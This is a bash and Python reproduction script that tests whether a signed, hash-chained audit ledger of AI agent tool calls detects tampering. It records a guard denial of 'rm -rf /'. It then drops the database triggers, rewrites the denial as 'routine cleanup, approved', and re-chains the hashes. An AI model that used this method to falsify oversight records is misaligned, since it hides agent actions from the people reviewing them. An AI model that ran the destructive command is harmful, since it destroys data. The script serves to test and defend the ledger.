#!/usr/bin/env bash
#
# Reproduction: `verify-session` reports every signature valid on a ledger whose
# payload has been rewritten.
#
#   bash examples/challenge/repro-stale-signature.sh
#
# The claim under test is the one in the README: that rewrites by an attacker
# with database access are detectable. For a *naive* rewrite that is true - the
# chain check recomputes each content_hash from its payload and the edit falls
# out immediately. This script does the non-naive version: edit the payload,
# then recompute the content_hash and every hash downstream, exactly as the
# documented v2 scheme prescribes.
#
# The chain is then internally consistent again, so only a signature can catch
# it. The attacker does not have the session's private key, so the signature
# over the *new* content_hash cannot be forged - the check should fail.
#
# Before 0.8.0 it did not - signatures were checked against a copy of the
# hash stored beside them, so re-chaining moved both operands together. That
# is fixed (F-1), and this script now demonstrates the fix rather than the
# gap: it rewrites a denial, re-chains, and the verifier catches it. Revert
# the fix and it reproduces the original behaviour again.

set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BIN="${ECTOLEDGER_BIN:-$ROOT/target/release/ironvise}"
PORT="${REPRO_PORT:-3177}"
W="$(mktemp -d)"
PID=""

# Git Bash rewrites `/tmp/…` in argv but not in the environment, so the server
# (which reads DATABASE_URL) and the sqlite3/python queries (which take argv)
# would open two different files. Resolve once to a native path; no-op outside
# Git Bash / MSYS.
command -v cygpath >/dev/null 2>&1 && W="$(cygpath -m "$W")"
trap '[ -n "$PID" ] && kill "$PID" 2>/dev/null; rm -rf "$W"' EXIT INT TERM

[ -x "$BIN" ] || { echo "build first: cargo build --release -p ectoledger"; exit 1; }

command -v sqlite3 >/dev/null 2>&1 || {
  echo "sqlite3 not found - this reproduction reads and rewrites the ledger with it."
  echo "  Debian/Ubuntu:  sudo apt-get install -y sqlite3"
  echo "  macOS:          brew install sqlite"
  echo "  Windows:        winget install SQLite.SQLite"
  exit 1
}

# Windows ships a `python3.exe` App Execution Alias that resolves on PATH,
# prints an advert for the Microsoft Store and exits non-zero. Probing for one
# that actually runs is the difference between reproducing the finding and
# silently skipping the rewrite - see the assertion after step 2.
PY=""
for cand in python3 python py; do
  if command -v "$cand" >/dev/null 2>&1 && "$cand" -c 'import sqlite3' >/dev/null 2>&1; then
    PY="$cand"; break
  fi
done
[ -n "$PY" ] || {
  echo "no working python3 found - needed to re-chain the hashes."
  echo "(a \`python3\` that only advertises the Microsoft Store does not count)"
  exit 1
}

echo "1. Build a ledger with a denied command in it."
DATABASE_URL="sqlite:$W/l.db" OBSERVER_TOKEN=demo GUARD_REQUIRED=false \
  ECTO_BIND_HOST=127.0.0.1 ECTO_BIND_PORT="$PORT" "$BIN" serve >"$W/s.log" 2>&1 &
PID=$!
for _ in $(seq 1 60); do
  curl -sf --max-time 1 -H "Authorization: Bearer demo" \
    "http://127.0.0.1:$PORT/api/sessions" >/dev/null 2>&1 && break
  sleep 1
done
export ECTOLEDGER_URL="http://127.0.0.1:$PORT" ECTOLEDGER_TOKEN=demo
printf '{"session_id":"r","tool_name":"Bash","tool_input":{"command":"rm -rf /"},"cwd":"%s","hook_event_name":"PreToolUse"}' "$ROOT" \
  | "$BIN" hook >/dev/null 2>&1
sleep 1; kill "$PID" 2>/dev/null; PID=""; sleep 1

SID=$(sqlite3 "$W/l.db" "SELECT id FROM agent_sessions LIMIT 1")
TARGET=$(sqlite3 "$W/l.db" \
  "SELECT sequence FROM agent_events WHERE json_extract(payload,'\$.type')='tripwire_rejection' LIMIT 1")
echo "   session $SID, denial at sequence $TARGET"
echo "   reason recorded: $(sqlite3 "$W/l.db" "SELECT json_extract(payload,'\$.reason') FROM agent_events WHERE sequence=$TARGET")"

echo
echo "2. Rewrite the denial and re-chain every hash from there to the tip."
"$PY" - "$W/l.db" "$TARGET" <<'PY'
import hashlib, sqlite3, sys
db, target = sys.argv[1], int(sys.argv[2])

def content_hash(prev, seq, payload, sid, created):
    blob = (b"ELv2\x00" + prev.encode() + b"\x00" + str(seq).encode() + b"\x00"
            + payload.encode() + b"\x00" + (sid or "").encode() + b"\x00"
            + created.encode())
    return hashlib.sha256(blob).hexdigest()

c = sqlite3.connect(db); c.row_factory = sqlite3.Row
# An attacker holding the file is not stopped by a trigger in that same file.
for (n,) in list(c.execute("SELECT name FROM sqlite_master WHERE type='trigger'")):
    c.execute(f"DROP TRIGGER IF EXISTS {n}")
c.execute("UPDATE agent_events SET payload=json_set(payload,'$.reason','routine cleanup, approved')"
          " WHERE sequence=?", (target,))
c.commit()

prev = None
for r in list(c.execute("SELECT id,sequence,previous_hash,content_hash,payload,created_at,session_id"
                        " FROM agent_events ORDER BY sequence")):
    if r["sequence"] < target:
        prev = r["content_hash"]; continue
    p = prev if prev is not None else r["previous_hash"]
    h = content_hash(p, r["sequence"], r["payload"], r["session_id"], r["created_at"])
    c.execute("UPDATE agent_events SET previous_hash=?, content_hash=? WHERE id=?", (p, h, r["id"]))
    prev = h
c.commit()
# agent_event_signatures is deliberately NOT touched. Every signature there is
# now over a content_hash that no event has any more.
stale = c.execute(
    "SELECT COUNT(*) FROM agent_event_signatures s JOIN agent_events e ON e.id=s.event_id"
    " WHERE s.content_hash <> e.content_hash").fetchone()[0]
print(f"   rewrote the reason and re-chained; {stale} signature(s) now sign a hash no event has")
c.close()
PY

REASON_NOW=$(sqlite3 "$W/l.db" \
  "SELECT json_extract(payload,'\$.reason') FROM agent_events WHERE sequence=$TARGET")
echo "   reason now reads: $REASON_NOW"

# Without this, a rewrite that failed for any reason leaves an untampered
# ledger, verify-session correctly returns 0, and the script below announces
# "This is the bug" about a ledger nobody touched. A reproduction that can
# report a finding it did not reproduce is worse than no reproduction.
[ "$REASON_NOW" = "routine cleanup, approved" ] || {
  echo
  echo "   The rewrite did not land - the reason is unchanged, so there is"
  echo "   nothing here to detect and any verdict below would be meaningless."
  echo "   Stopping rather than reporting a result this run did not produce."
  exit 1
}

echo
echo "3. Verify the session."
DATABASE_URL="sqlite:$W/l.db" OBSERVER_TOKEN=demo "$BIN" verify-session "$SID" 2>&1 \
  | grep -viE "OBSERVER_TOKEN|Dashboard" | sed 's/^/   /'
RC=${PIPESTATUS[0]}

echo
if [ "$RC" -eq 0 ]; then
  cat <<'TXT'
   ^ This is the bug. The ledger says a destructive command was waved through
     as "routine cleanup, approved", and verification is content.

     Why the signature did not catch it: verify_session_signatures checks the
     signature against `agent_event_signatures.content_hash` - the hash stored
     next to the signature - and never compares that to the event's current
     `agent_events.content_hash`. Both sides of the check moved together for
     the attacker, because only one of them is the actual data.
TXT
  exit 1
fi
echo "   Detected. The gap this script was written for is closed."
